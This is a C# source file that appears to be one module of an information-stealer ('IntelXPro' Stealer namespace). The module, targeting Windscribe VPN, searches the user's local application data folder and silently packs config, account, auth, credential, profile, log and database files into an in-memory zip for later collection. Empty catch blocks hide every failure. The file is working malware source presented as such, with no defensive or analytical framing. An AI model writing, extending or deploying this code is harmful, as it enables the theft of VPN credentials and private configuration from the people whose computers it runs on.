using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using System;
using System.IO;

namespace IntelXPro.src.IntelXPro.Stealer.Vpn
{
    internal class WindScribe : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string windscribePath = Path.Combine(localAppData, "Windscribe", "Windscribe2");

                if (Directory.Exists(windscribePath))
                {
                    var windscribeVpn = new Counter.CounterApplications { Name = "WindScribe" };
                    CollectWindscribeFiles(windscribePath, zip, counter, windscribeVpn);
                    
                    if (windscribeVpn.Files.Count > 0)
                    {
                        counter.Vpns.Add(windscribeVpn);
                    }
                }
            }
            catch { }
        }

        private void CollectWindscribeFiles(string basePath, InMemoryZip zip, Counter counter, Counter.CounterApplications windscribeVpn)
        {
            try
            {
                foreach (string file in Directory.GetFiles(basePath, "*", SearchOption.AllDirectories))
                {
                    try
                    {
                        string extension = Path.GetExtension(file).ToLower();
                        string fileName = Path.GetFileName(file).ToLower();
                        
                        if (extension == ".conf" || extension == ".ovpn" || extension == ".json" || 
                            extension == ".xml" || extension == ".cfg" || extension == ".log" ||
                            extension == ".txt" || extension == ".dat" || extension == ".db" ||
                            fileName.Contains("config") || fileName.Contains("settings") ||
                            fileName.Contains("account") || fileName.Contains("auth") ||
                            fileName.Contains("credential") || fileName.Contains("profile"))
                        {
                            string relativePath = Path.Combine("Vpn", "WindScribe", 
                                file.Substring(basePath.Length).TrimStart('\\'));
                            
                            zip.AddFile(relativePath, File.ReadAllBytes(file));
                            windscribeVpn.Files.Add(relativePath);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}
